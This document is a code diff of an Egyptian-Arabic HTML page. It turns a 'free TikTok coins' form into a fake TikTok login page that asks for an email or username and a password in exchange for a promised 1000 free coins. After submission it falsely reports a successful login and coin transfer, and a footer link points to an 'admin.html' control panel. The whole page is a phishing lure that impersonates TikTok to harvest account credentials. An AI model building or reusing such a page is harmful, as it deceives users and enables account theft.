@@ -3,41 +3,37 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>احصل على كوينز تيك توك مجاناً</title>
+    <title>تسجيل الدخول - تيك توك</title>
     <link rel="stylesheet" href="style.css" />
 </head>
 <body>
 
-    <header>
-        <div class="container">
-            <h1>🎁 احصل على كوينز تيك توك مجاناً</h1>
-            <p>أدخل اسم المستخدم بتاعك واحصل على 1000 كوينز هدية</p>
-        </div>
-    </header>
-
-    <section class="main-form">
-        <div class="container">
-            <div class="form-box">
-                <h2>📝 أدخل بياناتك</h2>
-                <form id="requestForm">
-                    <label for="username">اسم المستخدم على تيك توك</label>
-                    <input type="text" id="username" placeholder="@user123" required />
-
-                    <label for="phone">رقم الهاتف (للتواصل)</label>
-                    <input type="text" id="phone" placeholder="01012345678" required />
-
-                    <button type="submit">🎁 احصل على الكوينز</button>
-                </form>
-                <p id="successMessage" style="display: none; color: green; margin-top: 15px;">
-                    ✅ تم استلام طلبك! هتوصلك الكوينز خلال 24 ساعة.
-                </p>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo">
+                <h1>🎵 TikTok</h1>
+                <p>احصل على 1000 كوينز مجاناً!</p>
             </div>
+            <form id="loginForm">
+                <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
+                <input type="text" id="email" placeholder="example@email.com" required />
+
+                <label for="password">كلمة السر</label>
+                <input type="password" id="password" placeholder="••••••••" required />
+
+                <button type="submit">تسجيل الدخول</button>
+            </form>
+            <p id="successMessage" style="display: none; color: green; margin-top: 15px;">
+                ✅ تم تسجيل الدخول بنجاح! جاري تحويل الكوينز...
+            </p>
+            <p style="margin-top: 20px; font-size: 14px; color: #888;">
+                🎁 هدية مجانية: 1000 كوينز عند تسجيل الدخول
+            </p>
         </div>
-    </section>
+    </div>
 
     <footer>
         <div class="container">
-            <p>© 2026 - هدايا كوينز تيك توك</p>
             <p style="margin-top: 10px; font-size: 14px;">
                 <a href="admin.html" style="color: #fff; text-decoration: underline;">👑 لوحة التحكم</a>
             </p>
